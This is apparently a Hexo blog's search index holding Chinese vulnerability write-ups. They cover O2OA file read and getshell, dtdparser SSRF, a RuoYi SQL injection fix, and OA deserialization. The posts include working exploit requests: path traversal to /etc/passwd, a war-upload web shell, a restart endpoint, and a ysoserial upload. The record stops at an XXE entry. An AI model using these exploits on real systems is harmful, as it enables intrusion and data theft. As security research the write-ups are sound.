<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>通过js信息泄露扩大攻击面</title>
    <link href="/2022/01/04/72/"/>
    <url>/2022/01/04/72/</url>
    
    <content type="html"><![CDATA[<p>在每个站点的前端页面里都会有一个app开头的js文件</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&lt;script type=text/javascript src=<span class="hljs-regexp">/static/</span>js/app.xxxx.js&gt;&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><p>一般这个会写在最后（不一定），在前面一般是config.js之类的</p><p>在这类js文件里会有一些有用的其他的信息，比如账户密码、各种接口等，在做渗透测试时可以右键查看源码，然后找到app开头的js文件会有意想不到的惊喜</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>O2OA另一种方式shell</title>
    <link href="/2021/12/23/71/"/>
    <url>/2021/12/23/71/</url>
    
    <content type="html"><![CDATA[<p>三种组合漏洞<br>为了防止开发对脚本有改动，先通过任意文件读取查看o2server下的相应脚本内容，新建一个脚本把读取的内容复制粘贴，在脚本里加上自己的命令</p><p>通过任意文件上传把脚本再上传替换</p><p>通过重启接口重启，然后脚本就会被执行了<br><img src="/images/71/1.png"></p><p>前提是上传后没有被系统当作副本来命名为文件-副本 (ˉ▽ˉ；)</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>O2OAgetshell前传</title>
    <link href="/2021/12/22/70/"/>
    <url>/2021/12/22/70/</url>
    
    <content type="html"><![CDATA[<h1 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h1><p>在&lt;=6.4.4（20211121）版本后台中允许用户上传部署自定义jar/war服务，如果用户选customwar选项上传，<code>ActionUploadFile</code>类就会将文件以socket形式发送到服务端</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">src/main/java/com/x/program/center/jaxrs/<span class="hljs-built_in">command</span>/CommandAction.java<br></code></pre></div></td></tr></table></figure><p><img src="/images/70/1.png"><br> <code>execute-&gt;executeCommand</code><br><img src="/images/70/2.png"><br>随后服务端接收文件</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">src/main/java/com/x/server/console/NodeAgent.java<br></code></pre></div></td></tr></table></figure><p>在<code>run</code>方法中通过判断模式来执行相应模块，此处为部署服务<br><img src="/images/70/3.png"><br>跟进<code>redeploy</code>方法<br>前面说到了<code>strCommand</code>的值是<code>customWar</code>，所以直接看<code>case “customWar“</code><br><img src="/images/70/4.png"><br>转到<code>customWar</code>方法就可以看到文件已经被上传到指定位置<br><img src="/images/70/5.png"><br><img src="/images/70/6.png"></p><h1 id="查找执行命令的接口"><a href="#查找执行命令的接口" class="headerlink" title="查找执行命令的接口"></a>查找执行命令的接口</h1><p>但是上传后还要重启才可以部署完war<br><img src="/images/70/7.png"><br>那总不能干等目标重启吧，在上传的类中还有一个<code>executeCommand</code>方法</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">src/main/java/com/x/program/center/jaxrs/<span class="hljs-built_in">command</span>/CommandAction.java<br></code></pre></div></td></tr></table></figure><p><img src="/images/70/8.png"><br>跟进<code>execute</code><br>先看他的参数是什么<br><img src="/images/70/9.png"><br><img src="/images/70/10.png"><br>根据代码构造参数</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&#123;<span class="hljs-string">&quot;ctl&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;nodeName&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;nodePort&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>&#125;<br></code></pre></div></td></tr></table></figure><p>回到<code>execute</code>方法<br>跟上传一样通过socket发送数据到服务端<br><img src="/images/70/11.png"><br>服务端接收数据根据模式进入相应的实现<br><img src="/images/70/12.png"><br>此处的<code>strCommand</code>就是前面<code>ActionCommand.executeCommand</code>存的值（前面文件上传思路一样）<br><img src="/images/70/13.png"><br>服务端接收数据后根据正则匹配到的值跳到相应实现<br><img src="/images/70/14.png"><br>回到服务端<code>execute_command_pattern</code>模式，命令存放到<code>commandQueue</code>，<code>commandQueue</code>为<code>LinkedBlockingQueue</code>类定义的接口（文末介绍LinkedBlockingQueue类），在该类中有一个<code>take</code>方法取出存放的元素<br><img src="/images/70/15.png"><br>所以下一步就找到调用这个方法的类<br>在</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">src/main/java/com/x/server/console/Main.java<br></code></pre></div></td></tr></table></figure><p>中调用<code>commandQueue.take</code>取出元素来判断进入相应的实现<br><img src="/images/70/16.png"><br>往下看可以看到，当取出的元素包含有<code>restart_pattern</code>的值时就会进入<code>restart</code>方法<br><img src="/images/70/17.png"><br>查看<code>restart_pattern</code>的值<br><img src="/images/70/18.png"><br>从正则可知值为<code>restart</code>，所以参数如下</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&#123;<span class="hljs-string">&quot;ctl&quot;</span>:<span class="hljs-string">&quot;restart&quot;</span>,<span class="hljs-string">&quot;nodeName&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;nodePort&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>&#125;<br></code></pre></div></td></tr></table></figure><p><code>restart</code>方法就是停止所有服务然后调用相应脚本再在新线程里重新启动服务<br><img src="/images/70/19.png"></p><p>至此就可以通过参数来通过请求重启服务而不用等目标管理员重启了<br>根据路由构造请求</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">POST xxx/xxx/<span class="hljs-built_in">command</span>/execute<br></code></pre></div></td></tr></table></figure><p>根据前面构造的参数拼接</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">POST xxx/xxx/<span class="hljs-built_in">command</span>/execute<br><br><br><br>&#123;<span class="hljs-string">&quot;ctl&quot;</span>:<span class="hljs-string">&quot;restart&quot;</span>,<span class="hljs-string">&quot;nodeName&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;nodePort&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>&#125;<br></code></pre></div></td></tr></table></figure><p>这样就可以重启所有服务了<br><img src="/images/70/20.png"><br>重启一般是20秒左右</p><p>完整的验证详见<br><a href="https://novysodope.github.io/2021/11/30/67/">https://novysodope.github.io/2021/11/30/67/</a></p><p>改进<br>根据注释介绍<code>*</code>是所有节点，实际我们可以根据页面显示的选项来填对应主机部署重启，<br>也可以看<code>CommandAction</code>类，在该类中还有一个<code>nodeInfoList</code>方法是获取所有服务器信息的<br><img src="/images/70/21.png"><br>直接请求看一下就可以得到信息定点打击了<br><img src="/images/70/22.png"></p><h1 id="LinkedBlockingQueue类"><a href="#LinkedBlockingQueue类" class="headerlink" title="LinkedBlockingQueue类"></a>LinkedBlockingQueue类</h1><p>这个<code>LinkedBlockingQueue</code>跟<code>ArrayBlockingQueue类</code>差不多，而<code>ArrayList</code>跟<code>ArrayBlockingQueue</code>一样，所以可以理解为<code>LinkedBlockingQueue</code>也是用来存放东西的，即命令存到了<code>LinkedBlockingQueue</code>里，有关<code>LinkedBlockingQueue</code> 类的介绍可以看<br><a href="https://blog.csdn.net/tonywu1992/article/details/83419448">https://blog.csdn.net/tonywu1992/article/details/83419448</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dtdparser1.21 SSRF</title>
    <link href="/2021/12/22/69/"/>
    <url>/2021/12/22/69/</url>
    
    <content type="html"><![CDATA[<p>dtdparser is a component that parses DTD documents. The component does not correctly process the incoming parameters, resulting in ssrf vulnerabilities.</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">com\wutka\dtdparser\1.21\dtdparser-1.21.jar!\com\wutka\dtd\Tokenize.class<br></code></pre></div></td></tr></table></figure><p>In the main method of the jar package, determine which method to process the parameters by judging whether it contains ://<br><img src="/images/69/1.png"><br>When the parameter is http://, it will enter the DTDParser method that receives the URL object type parameter. After the parameter (that is, url) is passed in, the openStream method of the URL object will be used to open the request. There is no other verification before that. In order to cause the vulnerability, when the attacker passes parameters containing sensitive resources to it, this method will directly initiate a request for the resource through its own server<br><img src="/images/69/2.png"><br>When the parameter is other, it will enter the DTDParser method that receives the File object type parameter, and then use the FileReader object to read the parameter content one by one<br><img src="/images/69/3.png"></p><h1 id="verify"><a href="#verify" class="headerlink" title="verify"></a>verify</h1><p>See the startup class as Tokenize through the MANIFEST.MF file<br>Through the entry method, the parameter can be directly followed.<br>Such as probing port service<br>java -jar dtdparser-1.21.jar <a href="http://127.0.0.1:9000/">http://127.0.0.1:9000</a><br>There will be response data when there is a service on the port<br><img src="/images/69/4.png"><br>Because there is an analysis of the target dtd content in the main method, if it is not in the dtd format, an error will be reported (the parameter does not meet the conditions of \com\wutka\dtd\Scanner.class, and the method of the File object type handles the newline character of the parameter Because the condition of Scanner is not met an error will be reported, so only the first line will be displayed when the file is read<br><img src="/images/69/5.png"><br>When the port is not open, it will prompt that the connection is refused:<br><img src="/images/69/6.png"><br>When the port exists but there is no service, it will prompt the connection reset:<br><img src="/images/69/7.png"></p><p>In practical applications, the main trigger point is the DTDParser class, in which methods of various object types are provided, such as Reader object type, URL object type, File object type<br><img src="/images/69/8.png"></p><p>The web scene is written like this:<br>Reference dependency</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">&lt;dependency&gt;<br>         &lt;groupId&gt;com.wutka&lt;/groupId&gt;<br>         &lt;artifactId&gt;dtdparser&lt;/artifactId&gt;<br>         &lt;version&gt;1.21&lt;/version&gt;<br>     &lt;/dependency&gt;<br></code></pre></div></td></tr></table></figure><p>In order to be more intuitive, a display is specially added</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">wuDtD</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>       String result = <span class="hljs-keyword">null</span>;<br>       DTDParser parser = <span class="hljs-keyword">null</span>;<br>       <span class="hljs-keyword">try</span>&#123;<br>       String u = request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);<br>       <span class="hljs-keyword">if</span> (u.indexOf(<span class="hljs-string">&quot;://&quot;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>           parser = <span class="hljs-keyword">new</span> DTDParser(<span class="hljs-keyword">new</span> URL(u), <span class="hljs-keyword">true</span>);<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           parser = <span class="hljs-keyword">new</span> DTDParser(<span class="hljs-keyword">new</span> File(u), <span class="hljs-keyword">true</span>);<br>       &#125;<br>       DTD d = parser.parse(<span class="hljs-keyword">true</span>);<br>       <span class="hljs-keyword">if</span> (d != <span class="hljs-keyword">null</span>) &#123;<br>           <span class="hljs-keyword">if</span> (d.rootElement != <span class="hljs-keyword">null</span>) &#123;<br>               result = d.rootElement.getName();<br><br>           &#125;<br>       &#125;<br>       ServletOutputStream outputStream = response.getOutputStream();<br>       outputStream.write(result.toString().getBytes());<br>       outputStream.flush();<br>       outputStream.close();<br>   &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>           ServletOutputStream outputStream = response.getOutputStream();<br>           outputStream.write(e.toString().getBytes());<br>           outputStream.flush();<br>           outputStream.close();<br>           logger.error(e);<br>       &#125;<br>   &#125;<br></code></pre></div></td></tr></table></figure><p><img src="/images/69/10.png"></p><h1 id="Bug-fix"><a href="#Bug-fix" class="headerlink" title="Bug fix"></a>Bug fix</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (u.indexOf(<span class="hljs-string">&quot;://&quot;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>           <span class="hljs-keyword">if</span>(Notip.ipIsInner(u)||!u.contains(<span class="hljs-string">&quot;.dtd&quot;</span>))&#123;<span class="hljs-comment">//or endsWith</span><br>               ServletOutputStream outputStream = response.getOutputStream();<br>               outputStream.write(<span class="hljs-string">&quot;error&quot;</span>.toString().getBytes());<br>               outputStream.flush();<br>               outputStream.close();<br>           &#125;<span class="hljs-keyword">else</span> &#123;<br></code></pre></div></td></tr></table></figure><p><img src="/images/69/11.png"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>若依对sql注入的修复</title>
    <link href="/2021/12/21/68/"/>
    <url>/2021/12/21/68/</url>
    
    <content type="html"><![CDATA[<p>在看了几个若依的注入后发现其最新版还是会存在<code>$&#123;params.dataScope&#125;</code>，那这个参数是从哪来的呢，<code>$&#123;params.dataScope&#125;</code>的意思就是入参参数的dataScope属性,即 SysDept对象的dataScope属性，可能有点懵逼，随便找个有注入的点跟下去就知道，拿</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">src/main/java/com/ruoyi/web/controller/system/SysRoleController.java<br></code></pre></div></td></tr></table></figure><p>来说，在该层中有两处存在注入，拿其中的<code>unallocatedList</code>方法为例<br><img src="/images/68/1.png"><br>传入<code>selectUnallocatedList</code>方法查询，参数参考SysUser<br><img src="/images/68/2.png"><br>这个时候还没有dataScope，跟进<code>selectUnallocatedList</code>方法<br><img src="/images/68/3.png"><br>查看实现类对<code>selectUnallocatedList</code>方法的实现<br><img src="/images/68/4.png"><br>在方法的前面有一个注解<code>@DataScope(deptAlias = “d” )</code>，该注解为应用自定义，会根据权限来分配赋值，也就是在这里开始有了<code>params[dataScope]</code>，即<code>$&#123;params.dataScope&#125;</code><br><img src="/images/68/5.png"><br>其实现为<code>DataScopeAspect</code>类<br><img src="/images/68/6.png"><br>在该类的<code>dataScopeFilter</code>方法中有对dataScope参数做拼接的操作<br><img src="/images/68/7.png"><br>若依对<code>$&#123;params.dataScope&#125;</code>的修复比较逗，因为如果使用<code>#&#123;params.dataScope&#125;</code>的话是使用不了的，所以他们在对<code>DATA_SCOPE</code>做拼接查询之前直接把<code>$&#123;params.dataScope&#125;</code>的参数清空<br><img src="/images/68/8.png"><br><code>clearDataScope</code>方法<br><img src="/images/68/9.png"></p><p>这应该是无解了吧</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>o2oa 6.3.4后台getshell</title>
    <link href="/2021/11/30/67/"/>
    <url>/2021/11/30/67/</url>
    
    <content type="html"><![CDATA[<p>O2OA不依赖tomcat，采用自己的console.jar方式启动，因为不支持自定义jsp所以无法使用上传jsp来getshell。但是在后台中有一个上传jar/war包的功能，可以通过上传自定义jar/war包来部署自己服务，这篇笔记就记录一下通过部署war来getshell</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>按照官方文档，部署的war包要以o2的框架来开发编译：<br><a href="https://www.yuque.com/o2oa/course/tuef8c" title="搭建自定义工程及开发">自定义服务-搭建自定义工程及开发</a></p><p>工程模板：（文末有成品）<br><a href="https://git.o2oa.net/o2oa/o2custom-sample/-/archive/master/o2custom-sample-master.zip">https://git.o2oa.net/o2oa/o2custom-sample/-/archive/master/o2custom-sample-master.zip</a></p><p>首先跟着提示修改基本信息，然后改<code>SampleEntityClassNameAction</code>类的代码</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">/x_ahtest_assemble_control/src/main/java/com/x/ahtest/assemble/control/jaxrs/sample/SampleEntityClassNameAction.java<br></code></pre></div></td></tr></table></figure><p><img src="/images/67/2.png"><br>还要注意一下改filter，不然这个shell以后还得管理员登录才能访问：<br><code>AnonymousJaxrsServicePathFilter</code>类是定义可以在不登录的情况下访问请求，加上mapping<br><img src="/images/67/3.png"><br>修改打包完成后上传war包<br><img src="/images/67/1.png"><br>重启服务<br><img src="/images/67/4.png"></p><p>可以通过接口查看有没有部署成功</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">/x_program_center/jest/list.html<br></code></pre></div></td></tr></table></figure><p><img src="/images/67/6.png"></p><p>然后访问服务就可以执行命令了<br><img src="/images/67/5.png"></p><p>路由一般为</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">/模块名/jaxrs/sample/<br></code></pre></div></td></tr></table></figure><p>成品放github上了<br><a href="https://github.com/novysodope/O2OA-getshell">https://github.com/novysodope/O2OA-getshell</a></p><p>这个只是一个验证，具体shell实现还是要自己改一下，在SampleEntityClassNameAction类：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">/x_ahtest_assemble_control/src/main/java/com/x/ahtest/assemble/control/jaxrs/sample/SampleEntityClassNameAction.java<br></code></pre></div></td></tr></table></figure><p>可以改成内存马什么的</p><p>如果只是改类其他地方没改的话部署后的路由为<br><a href="http://localhost/x_ahtest_assemble_control/jaxrs/sample/cmd?cmd=calc">http://localhost/x_ahtest_assemble_control/jaxrs/sample/cmd?cmd=calc</a></p><h2 id="2021-11-30更新"><a href="#2021-11-30更新" class="headerlink" title="2021/11/30更新"></a>2021/11/30更新</h2><p>6.4.4也可以</p><h2 id="2021-12-01更新"><a href="#2021-12-01更新" class="headerlink" title="2021/12/01更新"></a>2021/12/01更新</h2><p>可以通过接口重启服务</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">/x_program_center/jaxrs/<span class="hljs-built_in">command</span>/execute <br><br><br><br>&#123;<span class="hljs-string">&quot;ctl&quot;</span>:<span class="hljs-string">&quot;命令&quot;</span>,<span class="hljs-string">&quot;nodeName&quot;</span>:<span class="hljs-string">&quot;target&quot;</span>,<span class="hljs-string">&quot;nodePort&quot;</span>:<span class="hljs-string">&quot;target&quot;</span>&#125;<br></code></pre></div></td></tr></table></figure><p>大概20秒左右就会重启成功</p>]]></content>
    
    
    <categories>
      
      <category>实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个商业开源oa的反序列化</title>
    <link href="/2021/11/02/66/"/>
    <url>/2021/11/02/66/</url>
    
    <content type="html"><![CDATA[<p>跟着src/main/java/com/xxx/oa/controller/IndexController.java转到index.jsp<br><img src="/images/66/1.png"><br>跟着index.jsp转到license.jsp，在该文件里有一个上传激活文件<br><img src="/images/66/0.png"><br>并且将上传的文件复制到<code>WEB-INF/license.dat</code>，随后调用<code>License</code>的<code>init</code>方法载入激活许可<br><img src="/images/66/2.png"><br>根据前面引用的包跟进<code>License</code>类的<code>init</code>方法查看如何处理激活文件<br><img src="/images/66/3.png"><br>src/main/java/com/xxx/oa/kernel/License.java<br>在该方法里会调用到<code>verify</code>方法<br><img src="/images/66/4.png"></p><p>在<code>verify</code>方法中：</p><p>直接获取激活文件封装为<code>ObjectInputStream</code>，并调用了对象输入流的<code>readObject方法</code>，通过反序列化生成的恶意文件来触发漏洞<br><img src="/images/66/5.png"></p><p>漏洞验证</p><p>漏洞url：结合未授权访问<br><a href="http://localhost:8088/xxx/xxx/license.jsp">http://localhost:8088/xxx/xxx/license.jsp</a><br><img src="/images/66/6.png"><br>首先使用<code>ysoserial</code>利用链生成一个利用文件<br><img src="/images/66/7.png"><br>回到漏洞页面，选择刚刚<code>ysoserial</code>生成的文件上传即可触发漏洞</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">POST /xxx/xxx/license.jsp?op=upload HTTP/1.1<br>Host: 172.20.10.14:8088<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytff7LLxYKC4UNQBS<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36<br>Connection: close<br>Content-Length: 481<br><br>------WebKitFormBoundarytff7LLxYKC4UNQBS<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;attachment0&quot;</span>; filename=<span class="hljs-string">&quot;123.dat&quot;</span><br>Content-Type: application/octet-stream<br><br>生成的二进制数据内容<br>------WebKitFormBoundarytff7LLxYKC4UNQBS--<br></code></pre></div></td></tr></table></figure><p><img src="/images/66/9.png"></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>o2oa的任意文件读取</title>
    <link href="/2021/11/01/65/"/>
    <url>/2021/11/01/65/</url>
    
    <content type="html"><![CDATA[<p>权当笔记</p><p>代码分析：<br>在<br>\src\main\java\com\x\xxx\xxx\jaxrs\config\ConfigAction.java的open方法中new了一个<code>ActionOpen</code>对象的<code>execute</code>方法来处理请求<br><img src="/images/65/1.png"><br>在该方法里<br>com/x/xxx/xxx/jaxrs/config/ActionOpen.java<br>先从参数filename处获取文件名<br><img src="/images/65/2.png"><br>文件名直接拼接到<code>config/</code>后面，然后使用<code>Config</code>的<code>base()</code>方法获取绝对路径，此处是漏洞产生的关键点<br><img src="/images/65/3.png"><br><img src="/images/65/4.png"><br>此时file的值为C:\web\config\filename</p><p>接下来判断file是否存在，如果存在就会用到工具类<code>FileUtils</code>的<code>readFileToString</code>方法直接读取文件<br><img src="/images/65/5.png"><br><img src="/images/65/6.png"><br>由于filename参数可控，所以可以利用<code>../</code>来跨目录访问文件</p><p>最后返回包含文件内容的结果<br><img src="/images/65/7.png"></p><p>漏洞验证：<br>根据路由构造路径</p><p><code>/xxx/jaxrs/config/open</code></p><p>根据代码<br><img src="/images/65/8.png"><br><img src="/images/65/9.png"><br>构造json格式的参数</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&#123;“filename”:”../../../../../../../../etc/passwd”&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/images/65/10.png"></p><h2 id="2021-11-30更新："><a href="#2021-11-30更新：" class="headerlink" title="2021/11/30更新："></a>2021/11/30更新：</h2><p>6.4.4还是存在</p><p>可以直接请求</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">POST /x_program_center/jaxrs/config/open HTTP/1.1<br>Host: 127.0.0.1:20020<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0<br>Accept: text/html,application/json,*/*<br>Accept-Language: zh-CN<br>Accept-Encoding: gzip, deflate<br>X-Requested-With: XMLHttpRequest<br>Content-Type: application/json; charset=utf-8<br>Content-Length: 39<br>Connection: close<br>Cookie: x-token=PfyuxmzgIzpQnJNvn-oq_HwUDX-wFwWE50QnO7mEHhA<br><br>&#123;<span class="hljs-string">&quot;fileName&quot;</span>:<span class="hljs-string">&quot;../../../../etc/passwd&quot;</span>&#125;<br></code></pre></div></td></tr></table></figure><p>运气好的话说明账号密码是默认的，直接读取，也可以登录后台getshell，如果文件不存在会提示</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&#123;<br>  <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>  <span class="hljs-string">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;time&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>    <span class="hljs-string">&quot;isSample&quot;</span>: <span class="hljs-literal">true</span><br>  &#125;,<br>  <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>  <span class="hljs-string">&quot;date&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>  <span class="hljs-string">&quot;spent&quot;</span>: 0,<br>  <span class="hljs-string">&quot;size&quot;</span>: -1,<br>  <span class="hljs-string">&quot;count&quot;</span>: 0,<br>  <span class="hljs-string">&quot;position&quot;</span>: 0<br>&#125;<br></code></pre></div></td></tr></table></figure><p>需要登录的话提示的是过期重新登录</p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>任意文件读取</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wutkajox XXE</title>
    <link href="/2021/10/29/64/"/>
    <url>/2021/10/29/64/</url>
    
